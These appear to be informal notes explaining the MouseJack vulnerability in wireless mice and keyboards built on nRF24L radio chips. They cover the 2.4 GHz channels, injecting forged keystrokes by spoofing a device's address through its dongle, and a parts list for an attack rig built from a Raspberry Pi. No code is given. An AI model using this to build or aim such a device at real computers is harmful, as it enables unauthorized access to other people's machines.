uses a widespread vulnerability to do with wireless hid devices
known as a MouseJack attack
wireless mice and keyboards use a seperate radio channel which doesnt check the sources of signals being recieved
most companies who produce these devices usually use chips from other companies rather than creating their own
the vulnerability is in a chip known as "NRF24L" and runs on 2.4ghz
This chip is highly popular and used by a wide range of producers (dell, logitech, microsoft, hp, amazon, gigabyte, lenovo, among more)
this chip uses the same frequencies as bluetooth and wifi, but uses only 83 frequencies that are 1mghz in width
That the covers everything between 2.4ghz to 2.483ghz

software level:
every wireless device has its own indiviudal mac address
the hack works by recieving the signal from a connected mouse/keyboard, and then using its mac address to send forged instructions to the computer via the connected dongle
if a hacker were to connect via a mouse, it could still be used as a keyboard,
	This is because both mice and keyboards are considered HID's, and this can be seen in windows device manager

hardware implementation:
to forge a signal, the hacker must have a device containing a "NRF24L" chip
e.g. crazy radio pa usb adapter, this can be used to amplify the signal if used with a good, high range antenna by 10-15 metres

crazy radio pa usb adapter or any other usb to nrf24l chip adapter
raspberry pi zero w
antenna
power source (any 3.7V battery should do)
micro sd card
female USB-A to micro usb
